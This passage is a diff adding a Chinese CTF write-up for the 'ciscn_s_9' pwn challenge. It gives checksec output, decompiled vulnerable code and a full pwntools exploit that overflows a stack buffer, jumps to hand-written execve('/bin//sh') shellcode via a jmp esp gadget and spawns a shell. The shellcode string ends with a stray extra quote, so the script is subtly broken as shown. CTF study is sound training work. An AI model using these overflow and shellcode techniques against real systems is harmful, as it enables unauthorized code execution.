@@ -609,3 +609,84 @@ p.interactive()
 
 在`printf_got`后面加一个`b'b'`为了做为`recvuntil()`的标记，泄露printf地址后就可以libc了
 
+## 60 cinscn_s_9
+
+***shellcode***
+
+`checksec`一下
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/buuctf/60/pwn'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x8048000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+    Debuginfo:  Yes
+```
+
+有`RWX`段,保护全关，估计`shellcode`,ida看看
+
+```c
+int pwn()
+{
+  char s[24]; // [esp+8h] [ebp-20h] BYREF
+
+  puts("\nHey! ^_^");
+  puts("\nIt's nice to meet you");
+  puts("\nDo you have anything to tell?");
+  puts(">");
+  fflush(stdout);
+  fgets(s, 50, stdin);
+  puts("OK bye~");
+  fflush(stdout);
+  return 1;
+}
+void hint()
+{
+  __asm { jmp     esp }
+}
+```
+
+有一个`jmp esp`函数，pwn函数里存在溢出点，但总计可以读入0x32字节，不够写`shellcraft.sh()`，所以要手写
+
+这边梳理一下流程
+
+`在栈上写入小shellcode->覆盖返回地址为jmp esp->让esp指向shellcode->主动调用esp`
+
+exp:
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux',log_level = 'debug',arch='i386')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+shellcode = '''
+xor    eax, eax
+push   eax
+push   0x68732f2f
+push   0x6e69622f
+mov    ebx, esp
+mov    ecx, eax
+mov    edx, eax
+mov    al, 0xb
+int    0x80
+''''
+shellcode = asm(shellcode)
+payload = shellcode.ljust(0x24,b'\x00')+p32(0x8048554)
+payload+=asm('sub esp,0x28;call esp')	# 0x24+0x4=0x28
+p.sendline(payload)
+
+p.interactive()
+```
+
+
+
